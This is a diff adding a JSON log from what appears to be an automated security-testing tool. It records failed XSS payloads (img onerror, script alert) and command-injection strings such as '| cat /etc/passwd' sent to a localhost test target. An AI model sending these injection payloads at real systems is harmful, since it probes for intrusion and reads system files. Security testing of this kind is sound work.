@@ -1,0 +1,218 @@
+[
+  {
+    "attack_type": "xss",
+    "payload": "<img src=''x'' onerror=''alert(1)''>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%27%27x%27%27+onerror%3D%27%27alert%281%29%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775134655.5526094,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "template",
+      "attack_type": "xss",
+      "payload": "<img src=''x'' onerror=''alert(1)''>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.087488174438477,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%27%27x%27%27+onerror%3D%27%27alert%281%29%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src=''''x'''' onerror=''''alert(1)''''>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%27%27%27%27x%27%27%27%27+onerror%3D%27%27%27%27alert%281%29%27%27%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775134655.5542336,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "llm",
+      "attack_type": "xss",
+      "payload": "<img src=''''x'''' onerror=''''alert(1)''''>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.063205003738403,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%27%27%27%27x%27%27%27%27+onerror%3D%27%27%27%27alert%281%29%27%27%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src=\"x\" onerror=\"alert(1)\">--",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%22x%22+onerror%3D%22alert%281%29%22%3E-- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775134655.5555182,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "agent",
+      "attack_type": "xss",
+      "payload": "<img src=\"x\" onerror=\"alert(1)\">--",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.041978359222412,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?description=%3Cimg+src%3D%22x%22+onerror%3D%22alert%281%29%22%3E-- (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd/* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd/* comment */",
+    "timestamp": 1775134655.5566201,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "template",
+      "payload": "| cat /etc/passwd/* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd/* comment */"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd#",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd#",
+    "timestamp": 1775134655.5573227,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "llm",
+      "payload": "| cat /etc/passwd#",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd#"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd/* comment */",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd/* comment */",
+    "timestamp": 1775134655.5579753,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "agent",
+      "payload": "| cat /etc/passwd/* comment */",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd/* comment */"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<script>alert(\"XSS\")</script>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?email=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775134881.481139,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "template",
+      "attack_type": "xss",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.068334579467773,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?email=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src='x' onerror='alert(1)'>/* comment */#",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cimg+src%3D%27x%27+onerror%3D%27alert%281%29%27%3E%2F%2A+comment+%2A%2F%23 (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775134881.484516,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "llm",
+      "attack_type": "xss",
+      "payload": "<img src='x' onerror='alert(1)'>/* comment */#",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.1152520179748535,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?name=%3Cimg+src%3D%27x%27+onerror%3D%27alert%281%29%27%3E%2F%2A+comment+%2A%2F%23 (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "xss",
+    "payload": "<img src=''x'' onerror=''alert(1)''>",
+    "target": "http://localhost:8080/test",
+    "is_successful": false,
+    "response": "0 - HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?comment=%3Cimg+src%3D%27%27x%27%27+onerror%3D%27%27alert%281%29%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))",
+    "timestamp": 1775134881.4864233,
+    "severity": "medium",
+    "confidence": 0.7,
+    "details": {
+      "strategy": "agent",
+      "attack_type": "xss",
+      "payload": "<img src=''x'' onerror=''alert(1)''>",
+      "url": "http://localhost:8080/test",
+      "status_code": 0,
+      "response_time": 4.064617156982422,
+      "error": "HTTPConnectionPool(host='localhost', port=8080): Max retries exceeded with url: /test?comment=%3Cimg+src%3D%27%27x%27%27+onerror%3D%27%27alert%281%29%27%27%3E (Caused by NewConnectionError(\"HTTPConnection(host='localhost', port=8080): Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。\"))"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd",
+    "timestamp": 1775134881.4896338,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "template",
+      "payload": "| cat /etc/passwd",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "; ls -la",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: ; ls -la",
+    "timestamp": 1775134881.4920282,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "llm",
+      "payload": "; ls -la",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: ; ls -la"
+    }
+  },
+  {
+    "attack_type": "command_injection",
+    "payload": "| cat /etc/passwd--",
+    "target": "local",
+    "is_successful": false,
+    "response": "Command not found: | cat /etc/passwd--",
+    "timestamp": 1775134881.4950058,
+    "severity": "high",
+    "confidence": 0.8,
+    "details": {
+      "strategy": "agent",
+      "payload": "| cat /etc/passwd--",
+      "exit_code": 1,
+      "stdout": "",
+      "stderr": "Command not found: | cat /etc/passwd--"
+    }
+  }
+]
